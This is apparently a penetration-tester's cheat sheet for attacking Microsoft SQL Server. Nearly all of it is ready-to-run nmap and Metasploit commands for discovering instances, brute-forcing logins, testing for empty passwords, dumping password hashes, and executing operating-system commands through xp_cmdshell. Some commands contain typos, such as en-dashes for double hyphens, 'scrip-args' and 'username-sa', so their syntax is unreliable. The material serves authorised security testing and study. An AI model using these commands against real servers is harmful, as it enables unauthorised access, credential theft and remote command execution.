---
description: 'TCP/1433, UDP/1434'
---

# MSSQL

### nmap scans

```bash
#use sql browser to find all
nmap -sU -p 1434 -sV $range
```

### nmap scripts

```bash
#all scripts
nmap -vv -sV -Pn -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa $ip

#gather info
nmap -p 1433 --script ms-sql-info $ip

#brute force
nmap -p 1433 --script ms-sql-brute $ip

#custom passwords list
 –script ms-sql-brute –script-args userdb=/usr/share/passwords.txt

# check for null sessions
nmap -p 1433 --script ms-sql-empty-password $ip

nmap -p 1433 --script ms-sql-hasdbaccess.nse --script-args  mssql.username=$user $ip

nmap -p 1433 --script ms-sql-tables.nse --script-args mssql.username=$user $ip

# ms sql 2000 has xp_cmdshell

nmap -p 1433 --script ms-sql-xp-cmdshell.nse --script-args mssql.username=$user $ip

nmap -p 1433 --script ms-sql-xp-cmdshell.nse --scrip-args=ms-sql-xp-cmdshell='net users',mssql.username=$user $ip

nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=$user $ip
```

### metasploit

```bash
msf> use auxiliary/scanner/mssql/mssql_ping
msf> set RHOSTS $ip
msf> run

msf> use auxiliary/scanner/mssql/mssql_login
msf> run

msf> use auxiliary/scanner/mssql/mssql_enum
msf> run

msf> auxiliary(mssql_exec) > set CMD 'ipconfig'
> run

msf> auxiliary(mssql_run) > run
```

